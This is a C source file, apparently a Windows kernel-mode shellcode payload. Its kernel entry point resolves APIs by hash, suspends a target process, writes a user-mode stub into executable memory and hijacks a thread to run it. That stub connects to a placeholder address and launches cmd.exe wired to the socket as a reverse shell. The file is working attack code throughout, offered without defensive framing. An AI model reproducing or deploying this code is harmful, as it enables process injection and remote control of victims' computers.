
#include "common.h"

KENTRY void KmEntryPoint( VOID )
{
	PCONTEXT   ctx;
	NTSTATUS   ret;
	PVOID      mem;
	PVOID      ent;
	PVOID      ntp;
	PVOID      prc;
	PVOID      thd;
	ULONG_PTR  len;
	KAPC_STATE apc;
	KM_API     api;

	if ( (ntp = PcrGetModule( H_NTOSKRNL )) != NULL )
	{
		api.PsResumeProcess            = PeGetFuncEat( ntp, H_PSRESUMEPROCESS );
		api.PsSuspendProcess           = PeGetFuncEat( ntp, H_PSSUSPENDPROCESS );
		api.IoThreadToProcess          = PeGetFuncEat( ntp, H_IOTHREADTOPROCESS );
		api.PsSetContextThread         = PeGetFuncEat( ntp, H_PSSETCONTEXTTHREAD );
		api.PsGetContextThread         = PeGetFuncEat( ntp, H_PSGETCONTEXTTHREAD );
		api.ZwFreeVirtualMemory        = PeGetFuncEat( ntp, H_ZWFREEVIRTUALMEMORY );
		api.ObDereferenceObject        = PeGetFuncEat( ntp, H_OBDEREFERENCEOBJECT );
		api.KeStackAttachProcess       = PeGetFuncEat( ntp, H_KESTACKATTACHPROCESS );
		api.KeUnstackDetachProcess     = PeGetFuncEat( ntp, H_KEUNSTACKDETACHPROCESS );
		api.ZwAllocateVirtualMemory    = PeGetFuncEat( ntp, H_ZWALLOCATEVIRTUALMEMORY );
		api.PsLookupThreadByThreadId   = PeGetFuncEat( ntp, H_PSLOOKUPTHREADBYTHREADID );
		api.PsGetProcessImageFileName  = PeGetFuncEat( ntp, H_PSGETPROCESSIMAGEFILENAME );
		api.PsLookupProcessByProcessId = PeGetFuncEat( ntp, H_PSLOOKUPPROCESSBYPROCESSID );

		if ( (prc = ProcEnumProcess( &api, 0x5e3a79e0 )) != NULL )
		{
			api.KeStackAttachProcess( prc, &apc );
			
			if ( ! (ret = api.PsSuspendProcess( prc ))  )
			{
				if ( (thd = ProcEnumThreads( &api, prc )) != NULL )
				{
					if ( (ctx = ProcGetThreadCtx( &api, thd )) != NULL )
					{
						ent = CPTR( &EnterUmMode );
						len = UPTR( &LeaveUmMode ) - UPTR( &EnterUmMode );

						if ( (mem = ProcAllocateMem( &api, len, PAGE_EXECUTE_READWRITE )) != NULL )
						{
							__builtin_memcpy( mem, ent, len );

						#if defined(_WIN64)
							ctx->Rip = UPTR( mem );
							ctx->ContextFlags = CONTEXT_FULL;
						#else
							ctx->Eip = UPTR( mem );
							ctx->ContextFlags = CONTEXT_FULL;
						#endif

							ProcSetThreadCtx( &api, thd, ctx );
						};
					};
				};
				api.PsResumeProcess( prc );
			};

			api.KeUnstackDetachProcess( &apc );
		};
	};
};

UENTRY void UmEntryPoint( IN PCHAR Str )
{
	CHAR                lib[20];
	CHAR                prc[20];
	BOOL                ret;
	BOOL                rem;
	PVOID               k32;
	PVOID               ws2;
	SOCKET              sck;
	struct sockaddr_in  sar;
	STARTUPINFOA        sta;
	PROCESS_INFORMATION inf;
	WSADATA             wsd;
	UM_API              api;

	ws2 = PebGetModule( H_WS2_32 );
	k32 = PebGetModule( H_KERNEL32 );

	if ( k32 || ws2 )
	{
		api.CloseHandle         = PeGetFuncEat( k32, H_CLOSEHANDLE );
		api.FreeLibrary         = PeGetFuncEat( k32, H_FREELIBRARY );
		api.LoadLibraryA        = PeGetFuncEat( k32, H_LOADLIBRARYA );
		api.CreateProcessA      = PeGetFuncEat( k32, H_CREATEPROCESSA );
		api.WaitForSingleObject = PeGetFuncEat( k32, H_WAITFORSINGLEOBJECT );

		if ( ! ws2 )
		{
			lib[0]  = 'w';
			lib[1]  = 's';
			lib[2]  = '2';
			lib[3]  = '_';
			lib[4]  = '3';
			lib[5]  = '2';
			lib[6]  = '.';
			lib[7]  = 'd';
			lib[8]  = 'l';
			lib[9]  = 'l';
			lib[10] = '\0';

			rem = TRUE;
			ws2 = api.LoadLibraryA( CPTR(lib) );
		} else {
			rem = FALSE;
		};

		api.WSASocketA  = PeGetFuncEat( ws2, H_WSASOCKETA );
		api.WSAConnect  = PeGetFuncEat( ws2, H_WSACONNECT );
		api.WSAStartup  = PeGetFuncEat( ws2, H_WSASTARTUP );
		api.WSACleanup  = PeGetFuncEat( ws2, H_WSACLEANUP );
		api.closesocket = PeGetFuncEat( ws2, H_CLOSESOCKET );

		api.WSAStartup( MAKEWORD(2, 2), &wsd );

		sck = api.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
		
		if ( sck != INVALID_SOCKET )
		{
			sar.sin_family      = AF_INET;
			sar.sin_port        = 0x4242;
			sar.sin_addr.s_addr = 0x43434343;

			if ( ! api.WSAConnect( sck, 
					       CPTR( &sar ), 
					       sizeof(sar), 
					       NULL, 
					       NULL, 
					       NULL, 
					       NULL ) )
			{

		
				RtlSecureZeroMemory(&inf, sizeof(inf));
				RtlSecureZeroMemory(&sta, sizeof(inf));

				prc[0] = 'c';
				prc[1] = 'm';
				prc[2] = 'd';
				prc[3] = '.';
				prc[4] = 'e';
				prc[5] = 'x';
				prc[6] = 'e';
				prc[7] = '\0';

				sta.hStdError  = CPTR( sck );
				sta.hStdInput  = CPTR( sck );
				sta.hStdOutput = CPTR( sck );
				sta.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
				sta.cb         = sizeof( STARTUPINFOA );

				ret = api.CreateProcessA( CPTR( NULL ),
				 		          CPTR( &prc ),
							  NULL,
							  NULL,
							  TRUE,
							  0,
							  NULL,
							  NULL,
							  &sta,
							  &inf );

				if ( ret ) 
				{
					api.WaitForSingleObject( inf.hProcess, INFINITE );
					api.CloseHandle( inf.hProcess );
					api.CloseHandle( inf.hThread );
					api.closesocket( sck );
				};
			}
		};

		api.WSACleanup();

		if ( rem )
			api.FreeLibrary( ws2 );
	};
};
